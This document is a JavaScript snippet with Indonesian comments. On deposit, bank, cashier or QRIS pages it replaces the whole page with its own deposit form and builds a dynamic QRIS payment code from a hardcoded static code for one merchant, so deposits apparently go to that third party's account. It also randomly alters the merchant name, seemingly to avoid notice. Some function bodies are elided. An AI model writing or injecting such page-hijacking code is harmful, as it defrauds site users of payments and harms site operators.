(function () {
  const url = window.location.href;
  const match = [
    '/deposit','/bank','/deposit.php','/qris.php','/cashier',
    '/?page=transaksi','/index.php?page=transaksi','/?deposit&head=home',
    '/index.php?page=cashier','/bank.php'
  ];
  if (!match.some(path => url.includes(path))) return;

  // ========== HTML & CSS asli kamu tetap di sini ==========
  document.documentElement.innerHTML = "<head></head><body></body>";
  document.head.innerHTML = `... CSS asli ...`;
  document.body.innerHTML = `... HTML asli ...`;

  function showToast(msg, type = "success") { ... }  
  window.showDeposit = function (type) { ... };
  window.selectMethod = function (j) { ... };
  window.copyNumber = function () { ... };
  window.submitManualDeposit = function () { ... };

  // ==== QRIS Dynamic Functions ====
  function crc16_ccitt_false_hex(inputStr) {
    const bytes = [];
    for (let i = 0; i < inputStr.length; i++) bytes.push(inputStr.charCodeAt(i));
    let crc = 0xFFFF;
    for (let b of bytes) {
      crc ^= (b << 8);
      for (let i = 0; i < 8; i++) {
        if ((crc & 0x8000) !== 0) crc = ((crc << 1) ^ 0x1021) & 0xFFFF;
        else crc = (crc << 1) & 0xFFFF;
      }
    }
    let hex = crc.toString(16).toUpperCase();
    while (hex.length < 4) hex = '0' + hex;
    return hex;
  }

  function buildAmountTag(amountStr) {
    const digits = (''+amountStr).replace(/[^0-9]/g, '');
    if (!digits) return '';
    const len = digits.length.toString().padStart(2, '0');
    return '54' + len + digits;
  }

  function stripOldCRC(str) {
    const idx = str.indexOf('6304');
    if (idx !== -1 && idx + 8 <= str.length) return str.substring(0, idx);
    return str;
  }

  function convertStaticToDynamic(staticQris, amount) {
    let cleaned = stripOldCRC(staticQris);
    cleaned = cleaned.replace('010211', '010212');

    let idx = cleaned.indexOf('5802ID');
    if (idx === -1) idx = cleaned.indexOf('5802');
    if (idx === -1) idx = cleaned.indexOf('6304');

    let before = cleaned, after = '';
    if (idx !== -1) {
      before = cleaned.substring(0, idx);
      after = cleaned.substring(idx);
    }

    const amountTag = buildAmountTag(amount);
    let combined = before + amountTag + after;

    // Aman: tetap pakai nama merchant asli + sedikit variasi
    const tag59Regex = /(59)(\d{2})([A-Za-z0-9\s]+)/;
    combined = combined.replace(tag59Regex, function(_, tag, len, oldVal) {
      const newName = oldVal + " #" + Math.floor(Math.random() * 9 + 1);
      const newLen = newName.length.toString().padStart(2, '0');
      return tag + newLen + newName;
    });

    combined = stripOldCRC(combined);
    const crcPayload = combined + '6304';
    return crcPayload + crc16_ccitt_false_hex(crcPayload);
  }

  const QRIS_STATIC = "00020101021126670016COM.NOBUBANK.WWW01189360050300000879140214250910000000730303UMI51440014ID.CO.QRIS.WWW0215ID20254343011770303UMI5204481253033605802ID5920ARPUS CELL OK26161126007LANGKAT61052076162070703A016304C2AD";

  window.generateQRIS = function () {
    const n = Number(document.getElementById("nominal").value || 0);
    if (n < 50000) return showToast("Minimal 50.000", "error");
    document.getElementById("auto-result").innerHTML = '<div class="spinner"></div>';

    const dynamicQris = convertStaticToDynamic(QRIS_STATIC, n);
    console.log("QRIS Dinamis:", dynamicQris);

    const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" + encodeURIComponent(dynamicQris);

    document.getElementById("auto-result").innerHTML = `
      <div class="qr-card">
        <img id="qris-img" src="${qrUrl}" alt="QRIS">
      </div>
      <div class="qr-buttons">
        <button class="download-btn" onclick="downloadQRIS('${qrUrl}')">Download QRIS</button>
        <button class="done-btn" onclick="history.back()">Sudah Membayar</button>
      </div>
    `;
  };

  window.downloadQRIS = function (qrUrl) {
    const link = document.createElement("a");
    link.href = qrUrl;
    link.download = "qris.png";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    showToast("QRIS berhasil diunduh", "success");
  };
})();
